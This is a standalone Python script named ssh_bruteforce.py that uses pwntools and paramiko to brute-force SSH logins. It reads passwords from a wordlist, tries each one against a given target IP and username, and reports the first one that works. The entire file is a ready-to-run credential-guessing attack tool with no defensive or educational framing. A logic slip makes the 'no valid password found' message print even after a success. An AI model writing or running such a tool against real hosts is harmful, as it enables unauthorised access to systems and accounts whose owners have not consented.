import paramiko
import sys
from pwn import ssh

if len(sys.argv) != 7:
    print("Usage: python ssh_bruteforce.py -i <TARGET_IP> -u <USERNAME> -w <WORDLIST_PATH>")
    sys.exit(1)

target_ip = ""
username = ""
password_file = ""

for i in range(1, len(sys.argv), 2):
    if sys.argv[i] in ['-i', '--ip']:
        target_ip = sys.argv[i+1]
    elif sys.argv[i] in ['-u', '--user']:
        username = sys.argv[i+1]
    elif sys.argv[i] in ['-w', '--wordlist']:
        password_file = sys.argv[i+1]

if not target_ip or not username or not password_file:
    print("Missing required arguments. Usage: python ssh_bruteforce.py -i <TARGET_IP> -u <USERNAME> -w <WORDLIST_PATH>")
    sys.exit(1)

print("\n[+] Starting SSH Brute Force Attack...")

attempts = 0
try:
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                print(f"[{attempts}] Attempting password: '{password}'")
                response = ssh(host=target_ip, user=username, password=password, timeout=3)

                if response.connected():
                    print(f"[✔] Valid password found: '{password}'!")
                    response.close()
                    break  # Stop brute force on success

                response.close()

            except paramiko.ssh_exception.AuthenticationException:
                print("[✖] Invalid password!")
            except paramiko.ssh_exception.SSHException:
                print("[!] Error: SSH Connection Failed (Check IP, User, or SSH Service)")

            attempts += 1
except FileNotFoundError:
    print("[!] Error: Password file not found.")
except KeyboardInterrupt:
    print("\n[!] User Interruption Detected. Exiting...")

print("\n[✖] No valid password found. Try a larger wordlist.")
